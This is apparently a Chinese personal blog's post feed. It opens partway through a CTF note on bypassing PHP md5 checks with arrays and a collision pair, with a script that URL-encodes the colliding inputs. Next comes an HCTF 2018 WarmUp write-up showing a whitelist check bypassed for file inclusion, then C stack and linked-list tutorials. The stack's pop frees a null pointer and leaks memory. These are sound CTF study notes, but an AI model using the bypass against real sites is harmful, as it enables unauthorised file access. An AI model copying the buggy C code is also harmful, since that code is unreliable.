md5() expects parameter 1 to be string, array given <span class="keyword">in</span> /home/kali/Documents/em_array.php on line 5</span><br><span class="line">PHP Warning:  md5() expects parameter 1 to be string, array given <span class="keyword">in</span> /home/kali/Documents/em_array.php on line 6</span><br></pre></td></tr></table></figure><p>虽然转换失败，但是返回了 null ，需要注意的是，在传递数组时应使用如下形式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=<span class="number">1</span> &amp; b[<span class="number">1</span>]=<span class="string">&quot;b&quot;</span> &amp; c[]</span><br></pre></td></tr></table></figure><h3>md5碰撞</h3><p>当上述方法都不奏效时：可以使用md5算法本身的漏洞；md5碰撞指的是不同的输入进行md5加密后得到同样的输出，网上有许多算法可以实现，需要注意的是，由于输入需上传服务器，故需要对输出进行url编码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!coding:utf-8</span></span><br><span class="line">hexString1 = <span class="string">&#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&#x27;</span></span><br><span class="line">hexString2 = <span class="string">&#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2&#x27;</span></span><br><span class="line"></span><br><span class="line">hexList1 = []</span><br><span class="line">intList1 = []</span><br><span class="line">asciiString1 =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    intString1 = hexString1[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">    hexString1 = hexString1[<span class="number">2</span>:]</span><br><span class="line">    hexList1.append(intString1)</span><br><span class="line">    <span class="keyword">if</span> (hexString1 == <span class="string">&#x27;&#x27;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hexList1:</span><br><span class="line">    intList1.append(<span class="built_in">int</span>(i,<span class="number">16</span>))</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> intList1:</span><br><span class="line">    asciiString1 += <span class="built_in">chr</span>(<span class="built_in">int</span>(j))</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;1.bin&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(asciiString1)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">hexList2 = []</span><br><span class="line">intList2 = []</span><br><span class="line">asciiString2 =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    intString2 = hexString2[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">    hexString2 = hexString2[<span class="number">2</span>:]</span><br><span class="line">    hexList2.append(intString2)</span><br><span class="line">    <span class="keyword">if</span> (hexString2 == <span class="string">&#x27;&#x27;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hexList2:</span><br><span class="line">    intList2.append(<span class="built_in">int</span>(i,<span class="number">16</span>))</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> intList2:</span><br><span class="line">    asciiString2 += <span class="built_in">chr</span>(<span class="built_in">int</span>(j))</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;2.bin&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(asciiString2)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">urlString1=<span class="string">&#x27;&#x27;</span></span><br><span class="line">urlString2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;1.bin&#x27;</span>):</span><br><span class="line">    urlString1 +=  urllib.parse.quote(line)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;2.bin&#x27;</span>):</span><br><span class="line">    urlString2 +=  urllib.parse.quote(line)</span><br><span class="line"></span><br><span class="line">print(urlString1)</span><br><span class="line">print(urlString2)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HCTF 2018WarmUp 1</title>
      <link href="2021/11/07/%5BHCTF%202018%5DWarmUp%201/"/>
      <url>2021/11/07/%5BHCTF%202018%5DWarmUp%201/</url>
      
        <content type="html"><![CDATA[<p>一上来便是一张天真无邪的笑脸<a id="more"></a><br><a href="https://www.helloimg.com/image/ChSkgt"><img src="https://www.helloimg.com/images/2021/11/07/ChSkgt.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/07/ChSkgt.png" srcset="data:image/png;base64,666" alt="ChSkgt.png"></a><br>无头绪，f12查源码，发现source.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;$page</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>开始代码审计</p><p>网页通过对传入的参数进行过滤后进行文件包含</p><p>一开始我以为是需要满足所有的条件，但根据下文包含文件的代码发现只需要满足其中一个就足够了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br></pre></td></tr></table></figure><p>在尝试了许久之后我发现重点在于最后一个判断，即从解码函数开始的判断；在解码之后出现了新的变量$_page，然后对该变量进行分割，取出变量中问号之前的部分，覆盖原来的变量，再判断该变量是否位于白名单内。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure><p>判断通过后对文件进行包含，这时遍历文件目录就能找到flag了，文件名称在hint.php里</p><p>最终payload：</p><p><a href="https://www.helloimg.com/image/Chigu0"><img src="https://www.helloimg.com/images/2021/11/07/Chigu0.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/07/Chigu0.png" srcset="data:image/png;base64,666" alt="Chigu0.png"></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用C语言实现栈</title>
      <link href="2021/09/05/stack_by_C/"/>
      <url>2021/09/05/stack_by_C/</url>
      
        <content type="html"><![CDATA[<h2>说明</h2><ul>    <li>作为栈顶的节点不存储数据<a id="more"></a>，仅作定位功能</li>    <li>数据项的类型可自行定义</li>    <li>在push和pop时，并不改变栈顶节点的位置，仅仅是将待操作节点加入或删除并改变指针指向而已</li>    <li>栈顶节点的数据项可用来存储当前栈的节点数，这点在push函数的定义中可以体现</li>    <li>主函数仅作各函数的演示使用，可自定义</li></ul><h2>定义相应结构</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;node;</span><br></pre></td></tr></table></figure><p>该结构由一个整型和一个指向此结构的指针组成。</p><h2>定义push函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">push</span><span class="params">(node *top, <span class="keyword">int</span> data)</span></span>&#123;</span><br><span class="line">node *temp = (node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">temp-&gt;data = data;</span><br><span class="line">temp-&gt;next = top-&gt;next;</span><br><span class="line">top-&gt;next = temp;</span><br><span class="line">    top-&gt;data++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul>    <li>第一步：分配空间</li>    <li>第二步：存储数据</li>    <li>第三步：改变栈顶和新增项的next指针，递增top节点的data项</li></ul><h2>定义pop函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pop</span><span class="params">(node *top)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!top-&gt;next)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stack is empty now.&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> pop_data = top-&gt;next-&gt;data;</span><br><span class="line">node *temp = top-&gt;next;</span><br><span class="line">top-&gt;next = top-&gt;next-&gt;next;</span><br><span class="line">temp = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">free</span>(temp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> pop_data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul>    <li>第一步：判断栈是否为空</li>    <li>第二步：定义变量存储待弹出的数据和待删除节点</li>    <li>第三步：改变栈顶的next指针</li>    <li>释放待删除节点空间，删除节点</li></ul><h2>定义初始化函数</h2><ul>    <li>为栈顶节点分配空间并初始化指针为空</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">node* <span class="title">stack_init</span><span class="params">()</span></span>&#123;</span><br><span class="line">node *temp = (node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">temp-&gt;data = <span class="number">0</span>;</span><br><span class="line">temp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2>定义遍历显示函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">(node *current)</span></span>&#123;</span><br><span class="line">current = current-&gt;next;</span><br><span class="line"><span class="keyword">while</span>(current)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,current-&gt;data);</span><br><span class="line">current = current-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul>    <li>将当前节点指向栈顶的下一个节点</li>    <li>当前节点不为空时进入遍历循环</li>    <li>打印当前节点的数据项</li>    <li>将当前节点指向下一个节点</li></ul><h2>源代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">push</span><span class="params">(node *top, <span class="keyword">int</span> data)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pop</span><span class="params">(node *top)</span></span>;</span><br><span class="line"><span class="function">node* <span class="title">stack_init</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">(node *current)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">push</span><span class="params">(node *top, <span class="keyword">int</span> data)</span></span>&#123;</span><br><span class="line">node *temp = (node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">temp-&gt;data = data;</span><br><span class="line">temp-&gt;next = top-&gt;next;</span><br><span class="line">top-&gt;next = temp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pop</span><span class="params">(node *top)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!top-&gt;next)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stack is empty now.&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> pop_data = top-&gt;next-&gt;data;</span><br><span class="line">node *temp = top-&gt;next;</span><br><span class="line">top-&gt;next = top-&gt;next-&gt;next;</span><br><span class="line">temp = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">free</span>(temp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> pop_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">node* <span class="title">stack_init</span><span class="params">()</span></span>&#123;</span><br><span class="line">node *temp = (node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">temp-&gt;data = <span class="number">0</span>;</span><br><span class="line">temp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">(node *current)</span></span>&#123;</span><br><span class="line">current = current-&gt;next;</span><br><span class="line"><span class="keyword">while</span>(current)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,current-&gt;data);</span><br><span class="line">current = current-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> first_input;</span><br><span class="line"><span class="keyword">int</span> pop_input, pop_data;</span><br><span class="line">node *top = stack_init();</span><br><span class="line"><span class="keyword">int</span> status;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter strings, Ctrl+Z to quit.\n&quot;</span>);</span><br><span class="line">status = <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;first_input);</span><br><span class="line"><span class="keyword">while</span>(status!=EOF)&#123;</span><br><span class="line">push(top, first_input);</span><br><span class="line">status = <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;first_input);</span><br><span class="line">&#125;</span><br><span class="line">display(top);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now enter 1 to pop data, 0 to quit.\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;pop_input);</span><br><span class="line"><span class="keyword">while</span>(pop_input==<span class="number">1</span>)&#123;</span><br><span class="line">pop_data = pop(top);</span><br><span class="line"><span class="keyword">if</span>(pop_data==<span class="number">-1</span>)&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pop_data: %d\n&quot;</span>,pop_data);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;pop_input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nDone\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> 知识输出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用C语言实现链表</title>
      <link href="2021/05/02/link_list_by_C/"/>
      <url>2021/05/02/link_list_by_C/</url>
      
        <content type="html"><![CDATA[<h2>第一步：定义相应结构</h2><p>由于实现链表的编程语言为C，不能够使用类，故使用结构来实现链表中的节点；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LinkList</span> &#123;</span></span><br><span class="line"><span class="keyword">char</span> name[MAX_INPUT];</span><br><span class="line"><span class="keyword">long</span> number;</span><br><span class="line">LinkList* next;</span><br><span class="line">&#125;Link;</span><br></pre></td></tr></table></figure><p>该结构由一个字符数组，一项编号和一个指向此结构的指针组成。</p><h2>第二步：定义输入函数</h2><p>为了更容易、更准确的获取输入，在程序中重新定义输入函数，在原有fgets()函数的基础上略作修改，得到新的输入函数s_gets()；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">s_gets</span><span class="params">(<span class="keyword">char</span>* st, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span>* ret_val;</span><br><span class="line"><span class="keyword">char</span>* find;</span><br><span class="line">ret_val = fgets(st, n, <span class="built_in">stdin</span>);</span><br><span class="line"><span class="keyword">if</span> (ret_val) &#123;</span><br><span class="line">find = <span class="built_in">strchr</span>(st, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (find) &#123;</span><br><span class="line">*find = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">while</span> (getchar() != <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret_val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数为返回类型为字符指针、接受参数为一个字符指针和一个整数的输入函数，其中字符指针就是字符数组名称，因为数组名称本质上就是数组首元素的地址，而该数组为字符数组，故该字符数组名称本质上就是字符指针；</p><p>在函数内部，我声明了两个字符指针，一个用来接受<a href="https://baike.baidu.com/item/fgets">fgets</a>函数的返回值，一个用来接受查找字符函数(<a href="https://baike.baidu.com/item/strchr">strchr</a>)的返回值；</p><p>关于fgets()函数：</p><ul>    <li>如果接受输入的字符数量超过字符数组的大小(MAX_INPUT)，fgets()函数会返回先前传入的地址，即字符数组的名称，并且把末尾的字符换为空字符('\0')，使之成为一个字符串；</li>    <li>如果接收输入的字符数量在字符数组的大小以内，那么fgets()函数会将空字符放置在换行符之前，然后同样返回先前传入的地址；</li>    <li>需要注意的是：fgets()函数在遇到文件结尾(EOF End Of File)时将会返回一个空指针；</li></ul><p>关于strchr()函数：</p><ul>    <li>在某个字符数组中查找某字符，并返回指向该字符的指针</li>    